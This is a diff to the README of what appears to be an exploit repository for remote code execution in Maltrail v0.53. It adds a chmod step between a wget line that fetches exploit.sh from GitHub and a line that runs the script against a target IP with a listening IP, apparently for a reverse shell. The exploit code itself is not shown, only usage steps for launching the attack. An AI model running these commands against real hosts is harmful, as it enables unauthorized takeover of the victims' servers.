@@ -19,6 +19,7 @@ This bash script sends a request using `curl` to the server that hosts maltrail.
 
 ```zsh
 wget https://raw.githubusercontent.com/Rubioo02/Maltrail-v0.53-RCE/main/exploit.sh
+chmod +x exploit.sh
 ./exploit.sh -t <TARGET_IP> -i <LISTENING_IP>
 ```
 
